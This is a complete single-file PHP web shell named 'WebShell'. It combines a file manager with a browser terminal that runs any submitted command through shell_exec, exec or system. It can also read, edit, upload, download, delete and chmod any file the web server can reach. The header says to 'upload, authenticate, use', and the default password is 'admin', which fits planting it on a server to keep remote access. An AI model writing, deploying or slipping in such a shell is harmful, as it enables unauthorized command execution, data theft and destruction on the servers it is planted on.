<?php
/**
 * WebShell — Compact File Manager + Terminal
 * Built for LO. Bootstrap 5, single-file, session-tracked CWD.
 * Save as .php, upload, authenticate, use.
 * 
 * Default password: admin   ← CHANGE THIS
 */
session_start();

// ─── Config ────────────────────────────────────────────────
define('PASSWORD', 'admin');
define('TITLE', 'WebShell');

// ─── Authentication ────────────────────────────────────────
if (isset($_POST['pass'])) {
    if ($_POST['pass'] === PASSWORD) {
        $_SESSION['auth'] = true;
    } else {
        $auth_error = 'Wrong password.';
    }
}
if (isset($_GET['logout'])) {
    unset($_SESSION['auth']);
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
if (empty($_SESSION['auth'])) {
    die('<!DOCTYPE html><html><head><title>' . TITLE . '</title>'
        . '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">'
        . '<meta name="viewport" content="width=device-width,initial-scale=1">'
        . '<style>body{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}'
        . '.login-box{background:#16213e;padding:2rem;border-radius:12px;box-shadow:0 0 30px rgba(0,0,0,.5);width:100%;max-width:400px}'
        . '.login-box h3{color:#e0e0e0;margin-bottom:1.5rem;text-align:center}'
        . '.login-box input{background:#0f3460!important;border:1px solid #533483!important;color:#e0e0e0!important}'
        . '.login-box input:focus{box-shadow:0 0 0 .2rem rgba(83,52,131,.5)!important;border-color:#7b2ff7!important}'
        . '.login-box .btn{background:#533483;border:none;width:100%}.login-box .btn:hover{background:#7b2ff7}'
        . '</style></head><body><div class="login-box"><h3>🔐 ' . TITLE . '</h3>'
        . (isset($auth_error) ? '<div class="alert alert-danger py-2">' . $auth_error . '</div>' : '')
        . '<form method="post"><input class="form-control mb-3" type="password" name="pass" placeholder="Password" autofocus>'
        . '<button class="btn btn-primary" type="submit">Authenticate</button></form></div></body></html>');
    exit;
}

// ─── Helpers ────────────────────────────────────────────────
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function normalize_path(string $path): string {
    $path = str_replace('\\', '/', $path);
    $path = preg_replace('#/+#', '/', $path);
    $real = realpath($path);
    return $real !== false ? str_replace('\\', '/', $real) : rtrim($path, '/');
}
function human_size(int $bytes): string {
    if ($bytes >= 1<<30) return number_format($bytes/(1<<30),2).' GB';
    if ($bytes >= 1<<20) return number_format($bytes/(1<<20),2).' MB';
    if ($bytes >= 1<<10) return number_format($bytes/(1<<10),2).' KB';
    return $bytes.' B';
}
function perm_str(int $perms): string {
    $out = '';
    for ($i=2; $i>=0; $i--) {
        $out .= ($perms >> ($i*3) & 4) ? 'r' : '-';
        $out .= ($perms >> ($i*3) & 2) ? 'w' : '-';
        $out .= ($perms >> ($i*3) & 1) ? 'x' : '-';
    }
    return $out;
}
function recursive_delete(string $dir): bool {
    if (!is_dir($dir)) return unlink($dir);
    $items = array_diff(scandir($dir), ['.','..']);
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? recursive_delete($path) : unlink($path);
    }
    return rmdir($dir);
}

// ─── Current Working Directory ──────────────────────────────
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd() ?: dirname(__FILE__);
}
$cwd = $_SESSION['cwd'];
if (isset($_GET['dir'])) {
    $newdir = normalize_path($_GET['dir']);
    if ($newdir && is_dir($newdir)) {
        $_SESSION['cwd'] = $cwd = $newdir;
    }
}

// ─── Action Handlers ────────────────────────────────────────
$message = '';
$tab = $_GET['tab'] ?? 'files';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // ── Terminal ────────────────────────────────────────────
    if ($action === 'terminal') {
        $cmd = $_POST['cmd'] ?? '';
        if (!isset($_SESSION['history'])) $_SESSION['history'] = [];

        if ($cmd === 'clear') {
            $_SESSION['history'] = [];
        } elseif (trim($cmd) !== '') {
            chdir($cwd);
            $output = '';
            if (preg_match('/^cd\s+(.+)/', trim($cmd), $m)) {
                $target = normalize_path($m[1]);
                if ($target && is_dir($target)) {
                    $_SESSION['cwd'] = $cwd = $target;
                    $output = ''; // cd produces no output
                } else {
                    $output = "cd: no such directory: {$m[1]}\n";
                }
            } else {
                $fullcmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
                if (function_exists('shell_exec')) {
                    $output = shell_exec($fullcmd) ?? '(no output)';
                } elseif (function_exists('exec')) {
                    exec($fullcmd, $lines, $rc);
                    $output = implode("\n", $lines);
                } elseif (function_exists('system')) {
                    ob_start();
                    system($fullcmd);
                    $output = ob_get_clean();
                } else {
                    $output = "No execution function available (shell_exec/exec/system disabled).";
                }
            }
            $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output, 'cwd' => $cwd];
            // Keep only last 100 entries
            if (count($_SESSION['history']) > 100) {
                $_SESSION['history'] = array_slice($_SESSION['history'], -100);
            }
        }
        $tab = 'terminal';
    }

    // ── Edit / Save File ────────────────────────────────────
    elseif ($action === 'save_file') {
        $file = $_POST['file'] ?? '';
        $content = $_POST['content'] ?? '';
        $real = realpath(dirname($file)) . '/' . basename($file);
        if (file_put_contents($real, $content) !== false) {
            $message = '<div class="alert alert-success py-1 mb-0">Saved: ' . h(basename($file)) . '</div>';
        } else {
            $message = '<div class="alert alert-danger py-1 mb-0">Failed to save: ' . h(basename($file)) . '</div>';
        }
    }

    // ── Delete ──────────────────────────────────────────────
    elseif ($action === 'delete') {
        $file = $_POST['file'] ?? '';
        $real = realpath(dirname($file)) . '/' . basename($file);
        if (file_exists($real)) {
            recursive_delete($real)
                ? $message = '<div class="alert alert-success py-1 mb-0">Deleted: ' . h(basename($file)) . '</div>'
                : $message = '<div class="alert alert-danger py-1 mb-0">Failed to delete: ' . h(basename($file)) . '</div>';
        }
    }

    // ── Rename ──────────────────────────────────────────────
    elseif ($action === 'rename') {
        $old = $_POST['old'] ?? '';
        $new_name = $_POST['new_name'] ?? '';
        $real_old = realpath(dirname($old)) . '/' . basename($old);
        $real_new = dirname($real_old) . '/' . basename($new_name);
        if (file_exists($real_old) && !file_exists($real_new)) {
            rename($real_old, $real_new)
                ? $message = '<div class="alert alert-success py-1 mb-0">Renamed to: ' . h($new_name) . '</div>'
                : $message = '<div class="alert alert-danger py-1 mb-0">Rename failed.</div>';
        } else {
            $message = '<div class="alert alert-danger py-1 mb-0">Invalid rename target.</div>';
        }
    }

    // ── Upload ──────────────────────────────────────────────
    elseif ($action === 'upload') {
        if (!empty($_FILES['uploaded']['tmp_name'])) {
            $dest = $cwd . '/' . basename($_FILES['uploaded']['name']);
            move_uploaded_file($_FILES['uploaded']['tmp_name'], $dest)
                ? $message = '<div class="alert alert-success py-1 mb-0">Uploaded: ' . h(basename($dest)) . '</div>'
                : $message = '<div class="alert alert-danger py-1 mb-0">Upload failed.</div>';
        }
    }

    // ── Create File / Folder ────────────────────────────────
    elseif ($action === 'create') {
        $name = basename($_POST['name'] ?? '');
        $type = $_POST['type'] ?? 'file';
        $path = $cwd . '/' . $name;
        if ($type === 'dir') {
            mkdir($path, 0755)
                ? $message = '<div class="alert alert-success py-1 mb-0">Created folder: ' . h($name) . '</div>'
                : $message = '<div class="alert alert-danger py-1 mb-0">Failed to create folder.</div>';
        } else {
            file_put_contents($path, '')
                ? $message = '<div class="alert alert-success py-1 mb-0">Created file: ' . h($name) . '</div>'
                : $message = '<div class="alert alert-danger py-1 mb-0">Failed to create file.</div>';
        }
    }

    // ── Chmod ───────────────────────────────────────────────
    elseif ($action === 'chmod') {
        $file = $_POST['file'] ?? '';
        $perms = $_POST['perms'] ?? '0755';
        $real = realpath(dirname($file)) . '/' . basename($file);
        $oct = octdec($perms);
        chmod($real, $oct)
            ? $message = '<div class="alert alert-success py-1 mb-0">Permissions updated: ' . $perms . '</div>'
            : $message = '<div class="alert alert-danger py-1 mb-0">Chmod failed.</div>';
    }
}

// ── Raw file view action ────────────────────────────────────
if (isset($_GET['action']) && $_GET['action'] === 'raw' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $real = realpath(dirname($file)) . '/' . basename($file);
    if (file_exists($real) && is_file($real)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($real);
        exit;
    }
    http_response_code(404);
    exit('File not found.');
}

// ── Download action ─────────────────────────────────────────
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $real = realpath(dirname($file)) . '/' . basename($file);
    if (file_exists($real) && is_file($real)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($real) . '"');
        header('Content-Length: ' . filesize($real));
        readfile($real);
        exit;
    }
    http_response_code(404);
    exit('File not found.');
}

// ─── Build file listing ─────────────────────────────────────
$files = [];
if (is_dir($cwd)) {
    $scan = @scandir($cwd);
    if ($scan) {
        foreach ($scan as $name) {
            if ($name === '.' || $name === '..') continue;
            $full = $cwd . '/' . $name;
            $stat = @stat($full);
            $files[] = [
                'name'  => $name,
                'path'  => $full,
                'isdir' => is_dir($full),
                'size'  => $stat['size'] ?? 0,
                'perms' => $stat['mode'] ?? 0,
                'mtime' => $stat['mtime'] ?? 0,
            ];
        }
    }
}
// Sort: directories first, then alphabetical
usort($files, function($a, $b) {
    if ($a['isdir'] !== $b['isdir']) return $a['isdir'] ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

// ─── Breadcrumb segments ────────────────────────────────────
$segments = array_filter(explode('/', trim($cwd, '/')));
$breadcrumb = [];
$accum = '';
foreach ($segments as $seg) {
    $accum .= '/' . $seg;
    $breadcrumb[] = ['name' => $seg, 'path' => $accum];
}

// ─── User/Host for terminal prompt ──────────────────────────
$whoami = function_exists('shell_exec') ? trim(shell_exec('whoami 2>/dev/null') ?? 'user') : 'user';
$hostname = function_exists('shell_exec') ? trim(shell_exec('hostname 2>/dev/null') ?? 'server') : 'server';
$prompt = $whoami . '@' . $hostname . ':' . (str_replace('/home/' . $whoami, '~', $cwd) ?: $cwd) . '$';

// ─── Determine terminal history ─────────────────────────────
$history = $_SESSION['history'] ?? [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= h($whoami . '@' . $hostname) ?> — <?= TITLE ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#c9d1d9;--accent:#7b2ff7;--accent-hover:#9d5cff;
               --green:#3fb950;--red:#f85149;--yellow:#d2991d;--dim:#8b949e}
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
        .navbar-custom{background:var(--surface);border-bottom:1px solid var(--border);padding:0 1rem}
        .navbar-custom .nav-link{color:var(--dim)!important;padding:.75rem 1.25rem;border-bottom:2px solid transparent;transition:all .15s}
        .navbar-custom .nav-link.active{color:var(--text)!important;border-bottom-color:var(--accent)}
        .navbar-custom .nav-link:hover{color:var(--text)!important}
        .navbar-custom .btn-logout{color:var(--red);background:none;border:1px solid var(--border);padding:.35rem .85rem;border-radius:6px;font-size:.85rem;transition:all .15s}
        .navbar-custom .btn-logout:hover{background:var(--red);color:#fff;border-color:var(--red)}
        .container-main{max-width:1300px;margin:0 auto;padding:1rem 1.5rem}
        .breadcrumb-custom{background:var(--surface);border-radius:8px;padding:.55rem 1rem;margin-bottom:1rem;border:1px solid var(--border);font-size:.9rem}
        .breadcrumb-custom a{color:var(--accent);text-decoration:none}
        .breadcrumb-custom a:hover{color:var(--accent-hover);text-decoration:underline}
        .breadcrumb-custom span{color:var(--dim)}
        .toolbar{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem}
        .toolbar .btn{padding:.4rem .9rem;font-size:.875rem;border-radius:6px;transition:all .15s}
        .btn-accent{background:var(--accent);color:#fff;border:none}.btn-accent:hover{background:var(--accent-hover);color:#fff}
        .btn-outline{background:none;color:var(--dim);border:1px solid var(--border)}.btn-outline:hover{color:var(--text);border-color:var(--dim)}
        .btn-danger-custom{background:none;color:var(--red);border:1px solid transparent}.btn-danger-custom:hover{background:var(--red);color:#fff}
        .table-custom{background:var(--surface);border-radius:8px;overflow:hidden;border:1px solid var(--border)}
        .table-custom th{background:var(--bg);color:var(--dim);font-weight:600;font-size:.8rem;text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--border);padding:.6rem .75rem}
        .table-custom td{color:var(--text);border-bottom:1px solid var(--border);padding:.5rem .75rem;font-size:.9rem;vertical-align:middle}
        .table-custom tr:hover td{background:rgba(123,47,247,.05)}
        .table-custom tr:last-child td{border-bottom:none}
        .file-icon{font-size:1.1rem;margin-right:.4rem}
        .file-icon.folder{color:var(--yellow)}.file-icon.file{color:var(--dim)}
        .file-link{color:var(--text);text-decoration:none;font-weight:500}.file-link:hover{color:var(--accent-hover)}
        .perm-tag{font-family:'JetBrains Mono','Consolas',monospace;font-size:.8rem;color:var(--dim)}
        .size-tag{font-family:'JetBrains Mono','Consolas',monospace;font-size:.8rem;color:var(--dim)}
        .terminal-container{background:#0a0a0a;border-radius:8px;border:1px solid var(--border);overflow:hidden}
        .terminal-header{background:#1a1a1a;padding:.4rem 1rem;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid #222}
        .terminal-dot{width:12px;height:12px;border-radius:50%;display:inline-block}
        .terminal-dot.red{background:#ff5f56}.terminal-dot.yellow{background:#ffbd2e}.terminal-dot.green{background:#27c93f}
        .terminal-body{padding:1rem;max-height:450px;overflow-y:auto;font-family:'JetBrains Mono','Consolas','Courier New',monospace;font-size:.85rem;line-height:1.6}
        .terminal-body .cmd-line{color:var(--green);margin-bottom:.15rem}
        .terminal-body .cmd-out{color:#aaa;margin-bottom:.75rem;white-space:pre-wrap;word-break:break-all}
        .terminal-input-row{display:flex;align-items:center;padding:.5rem 1rem;background:#111;border-top:1px solid #222}
        .terminal-prompt{color:var(--green);font-family:'JetBrains Mono','Consolas',monospace;font-size:.85rem;white-space:nowrap;margin-right:.5rem}
        .terminal-input-row input{flex:1;background:transparent;border:none;color:#fff;font-family:'JetBrains Mono','Consolas',monospace;font-size:.85rem;outline:none;caret-color:var(--accent)}
        .modal-dark .modal-content{background:var(--surface);border:1px solid var(--border);border-radius:10px}
        .modal-dark .modal-header{border-bottom:1px solid var(--border);color:var(--text)}
        .modal-dark .modal-footer{border-top:1px solid var(--border)}
        .modal-dark textarea,.modal-dark input{background:var(--bg)!important;color:var(--text)!important;border:1px solid var(--border)!important;font-family:'JetBrains Mono','Consolas',monospace;font-size:.85rem}
        .modal-dark textarea:focus,.modal-dark input:focus{box-shadow:0 0 0 .15rem rgba(123,47,247,.3)!important;border-color:var(--accent)!important}
        .btn-close-white{filter:invert(1)}
        .action-group{display:flex;gap:.25rem}
        .action-group .btn{padding:.2rem .5rem;font-size:.8rem}
        @media(max-width:768px){
            .container-main{padding:.5rem}
            .table-custom{font-size:.8rem}
            .toolbar .btn{font-size:.8rem;padding:.3rem .6rem}
        }
    </style>
</head>
<body>

<!-- ─── Navbar ─────────────────────────────────────────────── -->
<nav class="navbar-custom d-flex align-items-center justify-content-between">
    <div class="d-flex">
        <span class="text-accent fw-bold me-4" style="color:var(--accent);font-size:1.1rem;">⚡ <?= TITLE ?></span>
        <ul class="nav">
            <li class="nav-item">
                <a class="nav-link <?= $tab==='files'?'active':'' ?>" href="?tab=files&dir=<?= urlencode($cwd) ?>">
                    <i class="bi bi-folder2-open me-1"></i>File Manager
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link <?= $tab==='terminal'?'active':'' ?>" href="?tab=terminal">
                    <i class="bi bi-terminal me-1"></i>Terminal
                </a>
            </li>
        </ul>
    </div>
    <div class="d-flex align-items-center gap-3">
        <span style="color:var(--dim);font-size:.8rem;font-family:monospace"><?= h($cwd) ?></span>
        <a href="?logout" class="btn-logout text-decoration-none"><i class="bi bi-box-arrow-right"></i></a>
    </div>
</nav>

<div class="container-main">

<?= $message ?>

<!-- ─── File Manager Tab ───────────────────────────────────── -->
<?php if ($tab === 'files'): ?>
    <!-- Breadcrumb -->
    <div class="breadcrumb-custom">
        <a href="?tab=files&dir=<?= urlencode('/') ?>"><i class="bi bi-hdd-stack"></i></a>
        <span> / </span>
        <?php foreach ($breadcrumb as $i => $bc): ?>
            <a href="?tab=files&dir=<?= urlencode($bc['path']) ?>"><?= h($bc['name']) ?></a>
            <?php if ($i < count($breadcrumb) - 1): ?><span> / </span><?php endif; ?>
        <?php endforeach; ?>
    </div>

    <!-- Toolbar -->
    <div class="toolbar">
        <button class="btn btn-accent" data-bs-toggle="modal" data-bs-target="#uploadModal">
            <i class="bi bi-cloud-upload me-1"></i>Upload
        </button>
        <button class="btn btn-outline" data-bs-toggle="modal" data-bs-target="#createModal">
            <i class="bi bi-plus-lg me-1"></i>New
        </button>
        <span style="color:var(--dim);font-size:.8rem;margin-left:auto;align-self:center">
            <?= count($files) ?> items
        </span>
    </div>

    <!-- File Table -->
    <div class="table-custom">
        <table class="table table-borderless mb-0">
            <thead><tr><th style="width:40%">Name</th><th style="width:12%">Size</th><th style="width:18%">Permissions</th><th style="width:15%">Modified</th><th style="width:15%">Actions</th></tr></thead>
            <tbody>
            <?php if (dirname($cwd) !== $cwd): ?>
            <tr>
                <td colspan="5">
                    <a href="?tab=files&dir=<?= urlencode(dirname($cwd)) ?>" style="color:var(--dim);text-decoration:none">
                        <i class="bi bi-arrow-up-circle me-1"></i>..
                    </a>
                </td>
            </tr>
            <?php endif; ?>
            <?php foreach ($files as $f): ?>
            <tr>
                <td>
                    <i class="bi <?= $f['isdir'] ? 'bi-folder-fill file-icon folder' : 'bi-file-earmark file-icon file' ?>"></i>
                    <?php if ($f['isdir']): ?>
                        <a href="?tab=files&dir=<?= urlencode($f['path']) ?>" class="file-link"><?= h($f['name']) ?>/</a>
                    <?php else: ?>
                        <a href="javascript:void(0)" class="file-link"
                           onclick="viewFile('<?= h(addslashes($f['path'])) ?>','<?= h($f['name']) ?>')">
                            <?= h($f['name']) ?>
                        </a>
                    <?php endif; ?>
                </td>
                <td><span class="size-tag"><?= $f['isdir'] ? '—' : human_size($f['size']) ?></span></td>
                <td><span class="perm-tag"><?= sprintf('%04o', $f['perms'] & 07777) ?> (<?= perm_str($f['perms']) ?>)</span></td>
                <td style="font-size:.8rem;color:var(--dim)"><?= date('Y-m-d H:i', $f['mtime']) ?></td>
                <td>
                    <div class="action-group">
                        <?php if (!$f['isdir']): ?>
                        <button class="btn btn-outline btn-sm" title="Edit"
                                onclick="editFile('<?= h(addslashes($f['path'])) ?>','<?= h($f['name']) ?>')">
                            <i class="bi bi-pencil"></i>
                        </button>
                        <?php endif; ?>
                        <button class="btn btn-outline btn-sm" title="Rename"
                                onclick="renamePrompt('<?= h(addslashes($f['path'])) ?>','<?= h($f['name']) ?>')">
                            <i class="bi bi-pencil-square"></i>
                        </button>
                        <a class="btn btn-outline btn-sm" title="Download"
                           href="?action=download&file=<?= urlencode($f['path']) ?>">
                            <i class="bi bi-download"></i>
                        </a>
                        <button class="btn btn-outline btn-sm" title="Chmod"
                                onclick="chmodPrompt('<?= h(addslashes($f['path'])) ?>','<?= sprintf('%04o', $f['perms'] & 07777) ?>')">
                            <i class="bi bi-shield-lock"></i>
                        </button>
                        <button class="btn btn-danger-custom btn-sm" title="Delete"
                                onclick="deleteConfirm('<?= h(addslashes($f['path'])) ?>','<?= h($f['name']) ?>')">
                            <i class="bi bi-trash"></i>
                        </button>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
            <?php if (empty($files)): ?>
            <tr><td colspan="5" style="text-align:center;color:var(--dim);padding:2rem">(empty directory)</td></tr>
            <?php endif; ?>
            </tbody>
        </table>
    </div>
<?php endif; ?>

<!-- ─── Terminal Tab ───────────────────────────────────────── -->
<?php if ($tab === 'terminal'): ?>
    <div class="terminal-container">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span style="color:var(--dim);font-size:.8rem;margin-left:.5rem"><?= h($whoami . '@' . $hostname) ?></span>
        </div>
        <div class="terminal-body" id="terminalBody">
            <?php foreach ($history as $entry): ?>
            <div class="cmd-line"><?= h($entry['cwd'] ?? $cwd) ?>$ <?= h($entry['cmd']) ?></div>
            <div class="cmd-out"><?= h($entry['output']) ?></div>
            <?php endforeach; ?>
            <?php if (empty($history)): ?>
            <div style="color:var(--dim)">Terminal ready. Type <code style="color:var(--green)">help</code> to start.</div>
            <?php endif; ?>
        </div>
        <form method="post" class="terminal-input-row" id="termForm">
            <input type="hidden" name="action" value="terminal">
            <span class="terminal-prompt"><?= h($prompt) ?></span>
            <input type="text" name="cmd" id="termInput" autofocus autocomplete="off" placeholder="Type command...">
        </form>
    </div>
    <script>
        document.getElementById('termForm').addEventListener('submit', function(e) {
            let input = document.getElementById('termInput');
            if (!input.value.trim()) e.preventDefault();
        });
        document.getElementById('terminalBody').scrollTop = document.getElementById('terminalBody').scrollHeight;
    </script>
<?php endif; ?>

</div>

<!-- ─── Modals ──────────────────────────────────────────────── -->

<!-- Upload Modal -->
<div class="modal fade modal-dark" id="uploadModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <form method="post" enctype="multipart/form-data">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="bi bi-cloud-upload me-1"></i>Upload File</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" name="action" value="upload">
                    <p style="color:var(--dim);font-size:.85rem">Uploading to: <code><?= h($cwd) ?></code></p>
                    <input type="file" name="uploaded" class="form-control">
                </div>
                <div class="modal-footer">
                    <button class="btn btn-outline btn-sm" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-accent btn-sm" type="submit">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Create Modal -->
<div class="modal fade modal-dark" id="createModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <form method="post">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="bi bi-plus-lg me-1"></i>New File / Folder</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" name="action" value="create">
                    <input type="text" name="name" class="form-control mb-3" placeholder="Name" required>
                    <select name="type" class="form-select" style="background:var(--bg);color:var(--text);border:1px solid var(--border)">
                        <option value="file">File</option>
                        <option value="dir">Folder</option>
                    </select>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-outline btn-sm" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-accent btn-sm" type="submit">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Edit File Modal -->
<div class="modal fade modal-dark" id="editModal" tabindex="-1">
    <div class="modal-dialog modal-xl modal-dialog-scrollable">
        <div class="modal-content">
            <form method="post" id="editForm">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="bi bi-pencil me-1"></i>Edit: <span id="editFileName">—</span></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" name="action" value="save_file">
                    <input type="hidden" name="file" id="editFilePath">
                    <textarea name="content" id="editContent" rows="22" class="form-control" style="resize:vertical"></textarea>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-outline btn-sm" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-accent btn-sm" type="submit"><i class="bi bi-check-lg me-1"></i>Save</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- View File Modal -->
<div class="modal fade modal-dark" id="viewModal" tabindex="-1">
    <div class="modal-dialog modal-xl modal-dialog-scrollable">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title"><i class="bi bi-eye me-1"></i>View: <span id="viewFileName">—</span></h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <pre id="viewContent" style="background:var(--bg);color:var(--text);padding:1rem;border-radius:6px;
                font-family:'JetBrains Mono','Consolas',monospace;font-size:.8rem;max-height:60vh;overflow:auto;
                white-space:pre-wrap;word-break:break-all;margin:0">Loading...</pre>
            </div>
            <div class="modal-footer">
                <button class="btn btn-outline btn-sm" data-bs-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Delete Confirm Form (hidden) -->
<form method="post" id="deleteForm">
    <input type="hidden" name="action" value="delete">
    <input type="hidden" name="file" id="deleteFilePath">
</form>

<!-- Rename Form (hidden) -->
<form method="post" id="renameForm">
    <input type="hidden" name="action" value="rename">
    <input type="hidden" name="old" id="renameOldPath">
    <input type="hidden" name="new_name" id="renameNewName">
</form>

<!-- Chmod Form (hidden) -->
<form method="post" id="chmodForm">
    <input type="hidden" name="action" value="chmod">
    <input type="hidden" name="file" id="chmodFilePath">
    <input type="hidden" name="perms" id="chmodPerms">
</form>

<!-- ─── Scripts ────────────────────────────────────────────── -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
// Edit file
function editFile(path, name) {
    document.getElementById('editFilePath').value = path;
    document.getElementById('editFileName').textContent = name;
    fetch('?action=raw&file=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(t => {
            document.getElementById('editContent').value = t;
            new bootstrap.Modal(document.getElementById('editModal')).show();
        })
        .catch(() => alert('Failed to load file.'));
}

// View file
function viewFile(path, name) {
    document.getElementById('viewFileName').textContent = name;
    fetch('?action=raw&file=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(t => {
            document.getElementById('viewContent').textContent = t;
            new bootstrap.Modal(document.getElementById('viewModal')).show();
        })
        .catch(() => alert('Failed to load file.'));
}

// Delete confirmation
function deleteConfirm(path, name) {
    if (confirm('Delete "' + name + '"?\n\nThis action cannot be undone.')) {
        document.getElementById('deleteFilePath').value = path;
        document.getElementById('deleteForm').submit();
    }
}

// Rename prompt
function renamePrompt(path, oldName) {
    let newName = prompt('Rename "' + oldName + '" to:', oldName);
    if (newName && newName !== oldName) {
        document.getElementById('renameOldPath').value = path;
        document.getElementById('renameNewName').value = newName;
        document.getElementById('renameForm').submit();
    }
}

// Chmod prompt
function chmodPrompt(path, currentPerms) {
    let newPerms = prompt('Change permissions for:\n' + path + '\n\nEnter octal (e.g., 0755):', currentPerms);
    if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) {
        document.getElementById('chmodFilePath').value = path;
        document.getElementById('chmodPerms').value = newPerms;
        document.getElementById('chmodForm').submit();
    } else if (newPerms) {
        alert('Invalid permission format. Use octal, e.g., 0755');
    }
}

// Auto-focus terminal input on terminal tab
<?php if ($tab === 'terminal'): ?>
document.getElementById('termInput').focus();
<?php endif; ?>
</script>

</body>
</html>
